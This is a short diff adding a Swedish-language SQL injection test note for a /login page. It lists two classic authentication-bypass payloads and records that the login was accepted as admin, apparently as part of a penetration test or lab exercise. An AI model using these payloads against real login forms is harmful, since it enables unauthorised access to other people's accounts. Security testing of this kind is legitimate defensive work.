@@ -1,0 +1,7 @@
+[SQLi Test]
+URL: /login
+Payloads:
+ - username="admin' --", password="(blank)"
+ - username="admin", password="' OR '1'='1"
+Resultat: Inloggning accepterad (visades "Välkommen, admin!").
+Tid: (fyll i datum/tid)
